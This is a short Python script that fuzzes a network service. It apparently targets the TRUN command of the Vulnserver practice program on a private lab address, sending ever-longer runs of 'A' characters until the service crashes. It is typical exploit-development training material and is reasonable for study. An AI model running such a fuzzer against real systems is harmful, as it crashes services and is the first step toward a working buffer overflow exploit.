import sys, socket
from time import sleep

buffer ="A" * 100

while True: 
        try: 
             s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
             s.connect(('192.168.1.133',9999))
             print "Trying with buffer length %d" % len(buffer)
             s.send(('TRUN /.:/'+ buffer))
             s.close()
             sleep(1)
             buffer=buffer + "A"*100


        except: 
                print("Fuzzing Crashed at %s by" % str(len(buffer)))
                sys.exit()     